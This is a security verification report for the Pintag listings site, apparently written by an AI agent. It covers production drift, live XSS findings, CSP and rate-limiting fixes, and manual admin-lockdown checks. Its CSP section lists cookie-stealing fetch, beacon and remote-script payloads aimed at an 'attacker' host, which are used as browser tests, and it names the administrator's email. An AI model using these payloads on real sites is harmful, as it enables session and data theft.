# Pintag Production Security Verification — 2026-08-17

Follow-up pass to `docs/SECURITY_AUDIT_2026-08-17.md`. Objective: stop relying
on "the repository says so" and establish what is **actually true in
production**.

---

## Production Security Status: **NEEDS HARDENING**

Not because the security model is wrong — it is good, and it is now
considerably better — but because **none of it is deployed yet, and the two
XSS vulnerabilities the audit found are live on pintag.io right now.**

That is not a hedge. It is the single most important fact in this document,
and it is established by evidence, not inference (§1).

---

## ⚠ The constraint that shapes this entire report

**This session's network policy permits outbound HTTPS to `api.github.com` and
nothing else.** Verified directly:

```
https://eoladhcljbpbhnrmmpev.supabase.co/auth/v1/health   → connect_rejected (proxy 403)
https://pintag.io/                                        → connect_rejected (proxy 403)
https://api.cloudflare.com/client/v4/...                  → connect_rejected (proxy 403)
https://api.github.com                                    → 200
```

So I could **not**: query the production database, probe the live site, read
Supabase Auth settings, test storage policies with real accounts, exercise the
admin lockdown against live sessions, or configure Cloudflare.

Rather than guess, this pass did two things:

1. **Extracted the production evidence that *is* reachable** — via the GitHub
   Actions API, whose logs contain real read-only output from runs that *did*
   have production access (§1).
2. **Built the machine that produces the rest** — a read-only verification
   workflow plus two probe scripts that generate exactly the evidence Phases
   1, 3, 5, 10 and 11 asked for, in one click, once merged (§5).

Every claim below is labelled **VERIFIED** (with the method) or **NOT
VERIFIED** (with what would establish it). Nothing is labelled verified on the
strength of repository code alone.

---

## 1. Production drift — what was actually established

### 1.1 Database migration ledger — VERIFIED (as of 2026-08-13 01:57 UTC)

Source: GitHub Actions run `31659321340` (`Apply DB Migration (production)`,
the **only** run that workflow has ever had), step *"Migration history (before)
— read only"*. This is genuine `supabase migration list` output from a runner
that held the production credentials.

```
 Local            | Remote           | Time (UTC)
------------------|------------------|-----------------------
 `20260622000000` | `20260622000000` | 2026-06-22 00:00:00
 …                | …                | …
 `20260811000000` | `20260811000000` | 2026-08-11 00:00:00
 `20260812000000` | `20260812000000` | 2026-08-12 00:00:00

Remote database is up to date.
```

| Fact | Evidence |
|---|---|
| Production had applied everything through `20260812000000` | the ledger above |
| Every security migration from the post-breach lockdown (`20260804120000`–`20260806030000`) **is applied** | present in the ledger |
| `20260811000000` (analytics insert protections) **is applied** | present in the ledger |
| The apply workflow has run **exactly once, ever** | Actions API: `total_count: 1` |

**Drift found:** `20260813000000_property_images_registry.sql` was authored
*after* that run (commit `77376a2`) and **the apply workflow has not run
since**. Unless it was applied by hand in the SQL editor, it is **pending in
production**. This is a real repository↔production divergence, and it has a
consequence worth noting: if `property_images` does not exist in production,
then finding **F-04** (`rebuild_images_from_registry` ungated) was never
exploitable there — the function does not exist either.

**This must be resolved before the security migrations can be applied** — see
§4.

### 1.2 Deployed application code — VERIFIED

Source: GitHub Actions API, `deploy-prod.yml` and `deploy-functions.yml` run
history.

| Surface | Deployed commit | When | Contains the audit fixes? |
|---|---|---|---|
| pintag.io (Pages) | `7100c876` | 2026-08-16 12:15 UTC | **NO** |
| Edge Functions | `7100c876` | 2026-08-16 12:15 UTC | **NO** |

`7100c876` is `main`'s HEAD and predates every fix. Both audit fixes are on the
unmerged branch `claude/pintag-security-audit-ynsrgq`.

> **Therefore: F-01 (stored XSS into the administrator's session) and F-02
> (stored XSS on the public listing page) are LIVE on pintag.io as of this
> writing.** Nothing in either pass has changed that, because deployment
> requires a merge to `main`, which is not mine to perform.

### 1.3 Everything else — NOT VERIFIED

| Control | Why not | What settles it |
|---|---|---|
| Live RLS policies / views / function bodies | no DB access | §5 workflow, DB probe |
| Public sign-up state | no auth access | §5 workflow, `/auth/v1/settings` |
| Storage policy enforcement | no storage access | §5 workflow, §6 manual |
| Admin lockdown across the 5 privilege levels | needs real accounts + MFA | §6 manual |
| Security headers on the live site | site unreachable | §5 workflow |
| Cloudflare configuration | no API access | manual (docs/CSP.md, docs/RATE_LIMITING.md) |

---

## 2. Fixes applied in this pass

Everything below is committed on `claude/pintag-security-audit-ynsrgq` and is
**not deployed**.

### 2.1 Phase 4 — email-based and client-controlled authorization, eliminated

A full sweep of every authorization predicate in the schema
(`auth.email()`, `auth.role()`, `auth.jwt()`, `current_setting('request…')`)
found:

- **17 `auth.email() = 'admin@pintag.io'` predicates** — all but one inside
  *policies* dropped wholesale by the `20260804130000` / `20260804150000`
  lockdowns, which iterate `pg_policies` and drop by enumeration rather than by
  name. Those are gone from production. **Confirmed dead.**
- **One survivor:** `reset_weekly_views()` — a *function*, and functions are not
  dropped by a policy reset. Fixed in the first pass (migration
  `20260817000000`), and the production verifier now asserts that **no**
  `SECURITY DEFINER` function anywhere authorizes on `auth.email()`.

**New finding this pass — client-supplied identity laundering.**
`is_pintag_admin(p_uid uuid)` took the identity to check as an *argument* and is
granted to `anon` and `authenticated`. Every one of the 69 SQL call sites passes
`auth.uid()`, and all four admin Edge Functions pass the id returned by
`/auth/v1/user` for the caller's own token — so nothing legitimate ever asks
about somebody else. But the signature invites it: an MFA-verified non-admin
could ask "is *this* uuid an administrator?", and, far worse, the next policy
that forwarded a client-supplied id into this check would have become a
straightforward privilege escalation that looked correct at the call site.

Fixed in migration `20260817010000`: the function now answers **only** about
`auth.uid()` (a NULL argument means "me"), returning `false` rather than raising
so a mistaken caller fails closed. Six regression assertions cover it, including
that the administrator still authorizes normally.

### 2.2 Phase 6 — CSP, implemented and browser-verified

Full detail in **`docs/CSP.md`**. Summary:

**Pintag already had a CSP** — all 22 pages carried a meta tag; the first pass
missed it by grepping for headers. It was not adequate, and that is measured,
not asserted (Chromium, real policies):

| Exfiltration attempt | Old policy (`main`) | New policy |
|---|---|---|
| `fetch` → arbitrary attacker host | blocked | blocked |
| `fetch` → `attackerproject.supabase.co` | **ALLOWED** | blocked |
| image beacon → arbitrary host | **ALLOWED** (`img-src *`) | blocked |

`img-src *` is a complete exfiltration channel by itself, and the
`*.supabase.co` wildcard let an attacker exfiltrate to a project they create in
a minute. The replacement closes both.

- Single source of truth: `scripts/csp-policy.mjs`; stamped into all **17
  published pages** by `scripts/apply-csp.mjs` (idempotent, `--check` mode
  for CI).
- Delivered as `<meta http-equiv>` because **GitHub Pages cannot set headers at
  all**. Header-only directives (`frame-ancestors`, HSTS,
  `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy`,
  `X-Frame-Options`) are now emitted by the Cloudflare Worker on the four routes
  it fronts; a Transform Rule (documented, must be created in the dashboard)
  covers the rest including `admin.html`.
- The Worker deliberately does **not** emit a full CSP — two policies on one
  response are enforced as their intersection, so drift would silently start
  blocking real content.

**The honest limitation, stated plainly:** `script-src` retains
`'unsafe-inline'`. Pintag generates inline event handlers at render time with
interpolated data (`onclick="ptContactClick({listingId:'<uuid>'})"`). Nonces
cannot cover attributes; hashes cannot cover text that varies per listing.
Removing it requires migrating every generated handler to `addEventListener`
delegation across five files — a behavioural refactor deliberately not bundled
into a security pass, and tracked in `docs/CSP.md` with the exact steps.

**So the CSP does not stop injected script from running. It stops it from being
useful** — and that is measured, not asserted. `tests/csp/csp.spec.js` performs
each attack step in real Chromium and requires the browser to refuse it:

| Attack step an F-01/F-02 payload would use | Result |
|---|---|
| `fetch('https://attacker/?c='+document.cookie)` | **blocked** (`connect-src`) |
| `navigator.sendBeacon('https://attacker/…')` | **blocked** (`connect-src`) |
| `new Image().src='https://attacker/?d=…'` | **blocked** (`img-src`) |
| `<script src="https://attacker/payload.js">` | **blocked** (`script-src`) |
| `<base href="https://attacker/">` | **neutralised** (`base-uri`) |

Supabase origins are pinned to **exact hosts**, never `https://*.supabase.co` —
a wildcard would let an attacker exfiltrate to a Supabase project they created
themselves. A test asserts the wildcard never reappears.

**The browser test earned its place immediately:** it caught two
`img-src` violations on the homepage from `images.unsplash.com` hero
backgrounds declared as `background-image: url("https://…")` inside a `<style>`
block — invisible to every `src=`/`href=` grep in the inventory. An untested
CSP would have shipped a visibly broken homepage.

### 2.3 Phases 7 & 8 — abuse protection

Full detail in **`docs/RATE_LIMITING.md`**. The design splits deliberately:

**Layer 1 (primary, NOT configured — needs Cloudflare dashboard access):** five
specific rate-limiting rules, per endpoint, keyed on client IP, with the exact
match expressions, limits and actions. Explicitly **not** a blanket
`/rest/v1/*` limit — one legitimate listings.html load issues a burst of reads
plus an impression per rendered card, and a blanket rule would throttle a real
visitor. Only mutation endpoints are limited. Shared-IP reality (Vientiane
mobile traffic is heavily CGNAT'd) is why analytics rules use *Managed
Challenge* rather than *Block*, while fake-lead submission — the most
commercially damaging abuse — blocks at a tighter bound.

**Layer 2 (implemented, migration `20260817010000`):** per-**target** ceilings
that session-id rotation cannot bypass, because forging a new session id does
not give an attacker a new listing to inflate.

| Path | Ceiling | Why that number |
|---|---|---|
| `lead_events` INSERT | 30/min per (listing, type) | an order of magnitude above the busiest real listing |
| `listing_events` INSERT | 300/min per (property, type) | high on purpose — an impression fires per rendered card |
| `increment_listing_view()` | 120/min per listing | 2 views/sec sustained on one property is not real traffic here |

Both **fail open**: if the bookkeeping errors, the event is recorded anyway.
These are analytics counters; losing real traffic is worse than admitting some
fake traffic, and nothing security-critical depends on them.

**What Layer 2 does not do, stated plainly:** it bounds the *rate*, not the
*lifetime total*. A patient attacker spreading requests across days still
accumulates. Only an edge/IP limit fixes that. A ceiling that looks like a rate
limiter but is not one is worse than none, so the distinction is documented
rather than glossed.

`session_id` keeps its real job — correlating a visitor's events within one
visit — and must never again be treated as an anti-abuse mechanism. Regression
§H proves the point by rotating the session id on all 80 inserts, exactly as an
attacker would, and asserting the ceiling still holds.

**Can the database do better?** Unknown, and now answerable:
`pintag_client_network_probe()` (admin-only, read-only) reports whether
PostgREST forwards a usable client address. If it does, an IP-keyed limit
becomes implementable in-database. That is a question about deployed
infrastructure, so it is asked *of production* rather than guessed at.

### 2.4 Migration safety gate — widened deliberately, not weakened

`apply-migration.yml` was hard-coded to a single authorized migration
(`20260812000000`). It now takes an explicit **reviewed allowlist**
(`EXPECTED_MIGRATIONS`). The safety property is unchanged — *only what is named
runs* — and the refusal path is proven by test:

```
both authorized pending          → ALLOW
only one authorized pending      → ALLOW
an UNREVIEWED migration pending  → REFUSE (unexpected: 20260813000000)
a stranger pending               → REFUSE (unexpected: 20991231000000)
```

Note the third case: with `20260813000000` apparently still pending, **the
workflow will correctly refuse to run until that is resolved**. That refusal is
the gate working. See §4.

---

## 3. Verification evidence

| Control | Status | How |
|---|---|---|
| Data-layer fixes (F-03…F-06, F-09) hold | **VERIFIED (locally)** | 40 assertions on a real PostgreSQL 16 with production-shaped roles, grants and policies; proven to **fail** without the migrations |
| `is_pintag_admin` identity binding | **VERIFIED (locally)** | regression §G, 6 assertions |
| Analytics ceiling survives session rotation | **VERIFIED (locally)** | regression §H — 80 inserts, fresh session id each time, capped at 30 |
| View-inflation ceiling | **VERIFIED (locally)** | regression §I — 400 calls yielded ≤120 |
| XSS escaping (F-01/F-02) | **VERIFIED (locally)** | 15 tests, 13 payload classes × 4 implementations, asserted after a real HTML attribute-value decode; negative control confirms old `esc()` executes the payload |
| CSP breaks nothing | **VERIFIED (locally)** | all 17 published pages loaded in real Chromium, zero violations |
| CSP contains exfiltration | **VERIFIED (locally)** | 4 exfiltration primitives + `<base>` hijack, all refused by the browser |
| No behavioural regression | **VERIFIED (locally)** | 28/28 agent-visibility + 22/22 contact-tracking Playwright, under the enforced CSP |
| Full suite green | **VERIFIED (locally)** | 350 node tests + 71 Playwright + 40 SQL assertions |
| Production DB migration ledger | **VERIFIED (to 2026-08-13)** | GitHub Actions log, run 31659321340 |
| Deployed commit on pintag.io | **VERIFIED** | GitHub Actions API, deploy-prod history |
| **Live RLS / policies / functions** | **NOT VERIFIED** | needs §5 workflow |
| **Public sign-up state** | **NOT VERIFIED** | needs §5 workflow |
| **Storage boundaries in production** | **NOT VERIFIED** | needs §5 workflow + §6 |
| **Admin lockdown, 5 privilege levels** | **NOT VERIFIED** | needs §6 (real accounts + MFA) |
| **Security headers on the live site** | **NOT VERIFIED** | needs §5 workflow |
| **Cloudflare rate limiting** | **NOT CONFIGURED** | needs dashboard |

"Locally" means: against a real PostgreSQL and a real browser, using the real
policy predicates and the real shipped code — but **not** against production.

---

## 4. What you need to do, in order

Each step is one action and produces evidence.

**Step 1 — Merge the branch.** Nothing else can proceed; the fixes, the CSP, and
the verification workflow all live on
`claude/pintag-security-audit-ynsrgq`. A `workflow_dispatch` workflow must exist
on the **default branch** before GitHub will let it be run, so the verification
workflow is not dispatchable until this happens.

**Step 2 — Run *Verify Production Security* (read-only).**
Actions → **Verify Production Security** → *Run workflow*. Nothing is written.
Read the job summary. It answers, with evidence: is public sign-up open? Is
`20260813000000` in the production ledger? Do any views bypass RLS? Does any
write policy skip `is_pintag_admin`? Are the Edge Functions refusing anonymous
calls? Are the security headers present? **Is the XSS fix actually deployed?**

**Step 3 — Resolve the `20260813000000` question** using Step 2's ledger output.
If pending and you have reviewed it, add `20260813000000` to
`EXPECTED_MIGRATIONS` in `apply-migration.yml`; if already applied by hand,
nothing to do.

**Step 4 — Apply the security migrations.**
Actions → **Apply DB Migration (production)** → type `APPLY`. The workflow
dry-runs first, refuses anything not on the allowlist, applies, then verifies.
Both migrations are additive, idempotent, and touch **no row of data**.

**Step 5 — Re-run *Verify Production Security*.** Every control should now
report PASS. This is the artifact that proves production matches the repository.

**Step 6 — Create the Cloudflare Transform Rule** (`docs/CSP.md`) so
`admin.html` and the other tools get security headers.

**Step 7 — Create the Cloudflare rate-limiting rules** (`docs/RATE_LIMITING.md`).

**Step 8 — Run the manual admin-lockdown matrix** (§6). This is the one thing no
automation here can do, because it needs real credentials and a real TOTP.

---

## 5. The verification machine

| Artifact | What it does | Writes anything? |
|---|---|---|
| `.github/workflows/verify-production-security.yml` | one-click / weekly production drift check; fails red on drift; publishes a report to the job summary and a 90-day artifact | **No** |
| `scripts/verify-production-security.sql` | 20 catalog controls: RLS coverage, every policy, view execution mode, `SECURITY DEFINER` gating, grants, migration ledger, allowlist size | **No** — pure `SELECT`; prints counts and object names only, never an email, key or listing |
| `scripts/verify-production-http.sh` | 9 sections probing as an unauthenticated attacker: sign-up state, internal tables, the F-03 view, privileged RPCs, write boundary, storage, Edge Function auth, headers, **and whether the XSS fix is deployed** | **No** — reads `/auth/v1/settings` rather than attempting a registration, so it cannot leave an account behind |

The SQL verifier was itself validated end-to-end against a local replica, where
it correctly **caught a missing control** (the lockdown's privilege-layer
`REVOKE` was absent from the test fixture). It is not a rubber stamp.

---

## 6. Manual checks that need real credentials

These cannot be automated from CI without storing an admin password and a TOTP
seed in a secret — which the audit's own F-07 finding argues against.

**Admin lockdown matrix (Phase 11).** For each level, attempt: `PATCH
/rest/v1/properties`, `POST /rest/v1/rpc/reset_weekly_views`, `GET
/rest/v1/owners`, `GET /rest/v1/leads`, `POST
/functions/v1/generate-listing-content`, and a storage upload.

| # | Identity | Expected |
|---|---|---|
| 1 | unauthenticated (anon key) | every operation refused |
| 2 | signed-up non-admin | every operation refused |
| 3 | non-admin with MFA | every operation refused |
| 4 | **allowlisted admin, AAL1** (password entered, TOTP *not* yet) | **every operation refused** — this is the check that proves MFA is enforced at the data layer, not just in the browser |
| 5 | allowlisted admin, AAL2 | all succeed |

Level 4 is the important one. Run it by signing in and stopping before the TOTP
prompt, then using that access token:

```bash
curl -s -X PATCH "$SB/rest/v1/properties?id=eq.<ANY-UUID>" \
  -H "apikey: $ANON" -H "Authorization: Bearer <AAL1_TOKEN>" \
  -H 'Content-Type: application/json' -H 'Prefer: return=representation' \
  -d '{"title_en":"mfa-probe"}'
# PASS = []   (zero rows updated)
```

**Storage boundaries (Phase 10).** With the admin session, upload a throwaway
object, then attempt to read / replace / delete it as anon and as a non-admin.
Expected: read succeeds (both buckets are public-read CDN buckets by product
design), replace and delete refused. Use a throwaway object — never a real
listing photo.

**Do not** store the admin password in a GitHub secret to automate this.

---

## 7. Authentication and authorization — the actual model

**Authentication.** One production administrator (`cyrora.trading@gmail.com`),
email + password + TOTP. `admin-auth.js` is the client gate: it validates the
session server-side via `auth.getUser()` on every page load, refuses any other
email, and requires `currentLevel === 'aal2'`. Password reset is restricted to
the single admin address with an explicit `redirectTo`, so the panel cannot be
used to mail recovery links anywhere. No `signUp()` call exists anywhere in the
application. **Whether the auth *backend* also refuses sign-up is unverified** —
it is a dashboard toggle, and §5 Step 2 answers it.

**Authorization.** Exactly one primitive: `is_pintag_admin()` =
allowlist membership in `admin_accounts` **AND** `auth.jwt()->>'aal' = 'aal2'`
**AND** (new this pass) the identity asked about is the caller's own. Every RLS
policy, every storage policy, and all four admin Edge Functions flow through it,
so one function is the whole write boundary. Beneath RLS sits a privilege floor
(`REVOKE INSERT/UPDATE/DELETE … FROM anon`) so a permissive policy
re-introduced by accident still cannot write. Reads are public where the product
needs them (active listings, agent profiles, buyer contacts of active listings);
`owners` and `leads` have no anon policy at all.

---

## 8. Remaining risks

1. **The fixes are not deployed.** F-01 and F-02 are live. *(Step 1)*
2. **Cloudflare is unconfigured** — no rate limiting, and no security headers
   outside the four Worker routes. F-08/F-09 remain only partially mitigated.
3. **`'unsafe-inline'` remains in `script-src`.** Injected script still runs; it
   just cannot exfiltrate. Closing this needs the inline-handler refactor.
4. **Public sign-up state unknown.** If open, F-05's attack path (registering
   the deleted `admin@pintag.io`) was real until migration `20260817010000` — and
   the general "authenticated attacker" class stays reachable.
5. **`20260813000000` ledger state unknown**, blocking the migration apply.
6. **Production policy drift is unmeasured.** The 2026-08-03 breach was caused
   by exactly this. Step 2 measures it.
7. **Layer-2 ceilings bound rate, not lifetime totals.**
8. **A determined attacker with many IPs** defeats any IP-keyed limit.

---

## 9. Would I put sensitive production data behind this model today?

**Not yet — but the gap is deployment and configuration, not design.**

The design is genuinely sound: default-deny, a single MFA-gated write boundary
that every layer funnels through, a privilege floor beneath RLS, real SSRF
guards, storage writes locked to one account with an extension allowlist, and
now a CSP that contains exfiltration even where it cannot prevent execution.
For a single-operator property marketplace that is a defensible posture, and
better than most systems of this size.

Three things stand between that and "yes":

1. **Deploy.** A stored XSS into the only account with write access to
   everything is a total-compromise path, and it is live right now. Until Step 1
   happens, nothing else matters.
2. **Verify.** Every data-layer claim here is verified *locally*. Production has
   already diverged from its migrations once, with real consequences. Step 2
   converts belief into evidence; it takes one click.
3. **Confirm sign-up is off.** It decides whether "any authenticated user" is a
   real attacker class or an empty set, and it changes the severity of several
   findings.

Do those three and I would say **SECURE WITH ACCEPTED RISKS**, the accepted
risks being `'unsafe-inline'`, edge rate limiting until Cloudflare is
configured, and the residual that no IP-keyed limit survives a distributed
attacker.

One caveat that does not go away: for genuinely sensitive data — identity
documents, payment details, anything regulated — the single-administrator model
itself becomes the limiting factor. One compromised account is total
compromise, and no amount of RLS changes that. That is a fine trade for a
listings platform. It would need rethinking before Pintag holds anything more
sensitive than a phone number.

---

*Verification pass 2026-08-17. Branch `claude/pintag-security-audit-ynsrgq`.
Production evidence from GitHub Actions run 31659321340 and deploy history.
No production system was modified.*
